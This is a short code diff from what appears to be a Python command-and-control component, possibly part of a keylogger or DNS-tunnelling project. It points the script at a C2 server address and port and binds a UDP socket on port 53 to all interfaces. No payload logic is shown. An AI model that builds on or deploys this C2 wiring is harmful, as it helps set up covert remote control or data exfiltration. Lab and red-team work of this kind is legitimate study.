@@ -24,12 +24,12 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    C2_ip = "0.0.0.0"  # Replace with C2 server IP
-    C2_port = 10101
+    C2_ip = "10.0.0.196" # C2 server IP
+    C2_port = 10101 # C2 server port (mismatch due to port-fowarding)
     C2_addr = (C2_ip, C2_port)
-    ip = "localhost"
-    port = 53
     
+    ip = ""
+    port = 53
     addr = (ip, port)
     sock.bind(addr)
 
